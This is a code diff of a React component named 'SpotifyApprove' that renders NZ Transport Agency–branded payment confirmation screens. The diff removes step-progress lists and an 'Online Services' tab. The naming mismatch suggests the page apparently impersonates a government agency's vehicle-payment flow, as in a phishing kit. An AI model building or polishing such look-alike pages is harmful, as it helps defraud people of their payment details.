@@ -191,22 +191,8 @@ function SpotifyApprove({ onClose }) {
             </div>
           )}
 
-          <h1 className="nzta-title">Confirmation in App</h1>
 
-          <ol className="nzta-steps">
-            <li className="nzta-step done">
-              <span className="nzta-step-circle">1</span>
-              <span className="nzta-step-label">Enter vehicle details</span>
-            </li>
-            <li className="nzta-step done">
-              <span className="nzta-step-circle">2</span>
-              <span className="nzta-step-label">Enter payment details</span>
-            </li>
-            <li className="nzta-step active">
-              <span className="nzta-step-circle">3</span>
-              <span className="nzta-step-label">Confirmation</span>
-            </li>
-          </ol>
+          
 
           <hr className="nzta-divider" />
 
@@ -257,10 +243,7 @@ function SpotifyApprove({ onClose }) {
           <div className="nzta-logo">
             <img src={nztaLogo} alt="NZ Transport Agency" className="nzta-logo-img" />
           </div>
-          <div className="nzta-services-tab">
-            
-            <span>Online Services</span>
-          </div>
+          
         </div>
       </header>
 
@@ -279,21 +262,7 @@ function SpotifyApprove({ onClose }) {
 
         <h1 className="nzta-title">Payment confirmation</h1>
 
-        {/* ─── STEP 3 ACTIVE ─── */}
-        <ol className="nzta-steps">
-          <li className="nzta-step done">
-            <span className="nzta-step-circle">1</span>
-            <span className="nzta-step-label">Enter vehicle details</span>
-          </li>
-          <li className="nzta-step done">
-            <span className="nzta-step-circle">2</span>
-            <span className="nzta-step-label">Enter payment details</span>
-          </li>
-          <li className="nzta-step active">
-            <span className="nzta-step-circle">3</span>
-            <span className="nzta-step-label">Confirmation</span>
-          </li>
-        </ol>
+        
 
         <hr className="nzta-divider" />
 
